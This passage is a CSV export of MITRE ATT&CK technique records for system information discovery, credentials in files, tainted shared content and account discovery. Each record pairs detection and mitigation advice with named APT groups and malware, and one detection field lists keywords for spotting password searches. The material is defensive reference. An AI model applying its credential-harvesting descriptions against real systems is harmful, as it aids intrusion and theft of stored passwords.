AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: S-Type,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
214,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0086|ZLib]] has the ability to enumerate system information.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: ZLib,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
215,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",[u'A system info module in [[Software/S0046|CozyCar]] gathers information on the victim host\u2019s configuration.[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CozyCar, CozyDuke, ...",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
216,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0048|PinchDuke]] gathers system configuration information.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: PinchDuke,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
217,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","[""[[Software/S0139|PowerDuke]] has commands to get information about the victim's name, build, version, logical drives, drive type, free space, serial number, and memory usage.[[CiteRef::Volexity PowerDuke November 2016]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: PowerDuke,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
218,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['Several [[Group/G0032|Lazarus Group]] malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information.[[CiteRef::Novetta Blockbuster Destructive Malware]][[CiteRef::Novetta Blockbuster Loaders]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
219,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0144|ChChes]] collects the victim computer name.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ChChes, Scorpion, HAYMAKER",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
220,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0144|ChChes]] collects the victim hostname, window resolution, and Microsoft Windows version.[[CiteRef::Palo Alto menuPass Feb 2017]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ChChes, Scorpion, HAYMAKER",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
221,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0153|RedLeaves]] can obtain the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: RedLeaves, BUGJUICE",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
222,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0106|cmd]] can be used to find information about the operating system.[[CiteRef::TechNet Dir]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: cmd, cmd.exe",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
223,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0062|DustySky]] extracts basic information about the operating system.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: DustySky, NeD Worm",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
224,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Group/G0040|Patchwork]] collected the victim computer name, OS version, and architecture type and sent the information to its C2 server .[[CiteRef::Cymmetria Patchwork]]']",['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
225,"['While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [[Technique/T1078|Valid Accounts]] for more information.']",[],['545'],[],"['File monitoring', 'Process command-line parameters']","['If an initial connectivity check fails, [[Software/S0067|pngdowner]] attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.[[CiteRef::CrowdStrike Putter Panda]]']",['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences.[[CiteRef::Microsoft MS14-025]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",['Access to files'],Software: pngdowner,['Credential Access'],['Technique/T1081'],['Credentials in Files'],https://attack.mitre.org/wiki/Technique/T1081
226,"['While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [[Technique/T1078|Valid Accounts]] for more information.']",[],['545'],[],"['File monitoring', 'Process command-line parameters']",['[[Software/S0117|XTunnel]] is capable of accessing locally stored passwords on victims.[[CiteRef::Invincea XTunnel]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences.[[CiteRef::Microsoft MS14-025]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",['Access to files'],"Software: XTunnel, X-Tunnel, XAPS",['Credential Access'],['Technique/T1081'],['Credentials in Files'],https://attack.mitre.org/wiki/Technique/T1081
227,"['While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [[Technique/T1078|Valid Accounts]] for more information.']",[],['545'],[],"['File monitoring', 'Process command-line parameters']",['[[Software/S0161|XAgentOSX]] contains the getFirefoxPassword function to attempt to locate Firefox passwords.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences.[[CiteRef::Microsoft MS14-025]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",['Access to files'],Software: XAgentOSX,['Credential Access'],['Technique/T1081'],['Credentials in Files'],https://attack.mitre.org/wiki/Technique/T1081
228,"['While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [[Technique/T1078|Valid Accounts]] for more information.']",[],['545'],[],"['File monitoring', 'Process command-line parameters']",['[[Group/G0007|APT28]] has been known to specifically look for Firefox passwords on the file system [[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences.[[CiteRef::Microsoft MS14-025]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",['Access to files'],[],['Credential Access'],['Technique/T1081'],['Credentials in Files'],https://attack.mitre.org/wiki/Technique/T1081
229,"['While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [[Technique/T1078|Valid Accounts]] for more information.']",[],['545'],[],"['File monitoring', 'Process command-line parameters']","['[[Software/S0089|BlackEnergy]] has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Mozilla password manager, Google Chrome password manager, Outlook, Internet Explorer, and Windows Credential Store.[[CiteRef::F-Secure BlackEnergy 2014]][[CiteRef::Securelist BlackEnergy Nov 2014]]']",['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],['Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences.[[CiteRef::Microsoft MS14-025]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",['Access to files'],"Software: BlackEnergy, Black Energy",['Credential Access'],['Technique/T1081'],['Credentials in Files'],https://attack.mitre.org/wiki/Technique/T1081
230,['Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to [[Command and Control]] and possible network [[Discovery]] techniques.'],[],['562'],[],"['File monitoring', 'Process monitoring']",['[[Group/G0012|Darkhotel]] uses a virus that propagates by infecting executables stored on shared drives.[[CiteRef::Kaspersky Darkhotel]]'],['Darkhotel'],['Darkhotel'],['G0012'],"['Protect shared folders by minimizing users who have write access. Use utilities that detect or mitigate common features used in exploitation, such as the Microsoft Enhanced Mitigation Experience Toolkit (EMET).\n\nIdentify potentially malicious software that may be used to taint content or may result from it and audit and/or block the unknown programs by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Access to shared folders and content with write permissions'],[],['Lateral Movement'],['Technique/T1080'],['Taint Shared Content'],https://attack.mitre.org/wiki/Technique/T1080
231,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
232,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0125|Remsec]] can obtain a list of users.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
233,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
